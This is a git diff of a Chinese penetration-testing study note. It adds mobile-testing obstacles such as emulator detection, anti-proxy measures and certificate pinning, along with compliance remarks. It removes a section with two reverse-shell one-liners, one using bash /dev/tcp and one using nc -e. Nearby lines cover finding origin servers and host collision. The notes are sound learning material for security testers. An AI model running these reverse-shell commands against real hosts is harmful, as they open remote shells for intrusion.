@@ -1,3 +1,5 @@
+本笔记记录非结构化的渗透测试知识，例如某些特定测试技巧，或者一些杂乱的知识。当杂乱知识积累到一定程度之后，应该想办法整理成结构化的知识，写进[渗透测试笔记](./penetration.md)，[工具使用笔记](./pen_tools.md)或者[组件笔记](./knowledge_components.md)
+
 # 读文章
 
 怎么做笔记：
@@ -137,6 +139,15 @@ localStorage与sessionStorage
 
 ## Quake
 
+# 移动端渗透
+
+限制
+
+- 模拟器检测：通过检测手机号、型号、网络等信息
+  - 绕过方法：使用真机。检测不够严格的可以用模拟器虚拟真机型号；想炫技的可以逆向绕过检测代码
+- 反代理
+- 证书校验
+
 # 其他
 
 ## PTES Technical Guidelines
@@ -155,13 +166,6 @@ localStorage与sessionStorage
 ## Host碰撞
 
 若服务器配置了只能通过域名访问，“关闭”服务器时仅仅解除了域名解析，没有真正关掉服务器，我们收集到历史域名就能尝试通过此域名访问服务器。历史域名和IP往往不匹配，很可能要在大量候选IP中碰撞出真正的地址
-
-## 反弹Shell
-
-```bash
-bash -i >& /dev/tcp/ip/port 0>&1  # 简单方便。需要bash和dev权限
-nc -e /bin/bash ip port           # 需要目标安装了nc
-```
 
 ## 业务
 
@@ -220,6 +224,10 @@ nc -e /bin/bash ip port           # 需要目标安装了nc
 
 商用密码应用安全性评估
 
+
+
+等保 - 公安；密码 - 保密局
+
 ## TLS版本过低
 
 Firefox：打开about:config，将`security.tls.version.min`改成1
@@ -242,3 +250,6 @@ php: `htmlspecialchars`；mysqli：`mysqli_real_escape_string`
 3. HTTP方法，如OPTIONS请求，反向代理一般只支持`GET, HEAD`
 4. 非法URL，如`/%00, /..;/`，有异常信息则为源服务器
 5. 响应时间，一般源站的抖动较明显
+
+## 未整理杂乱笔记
+
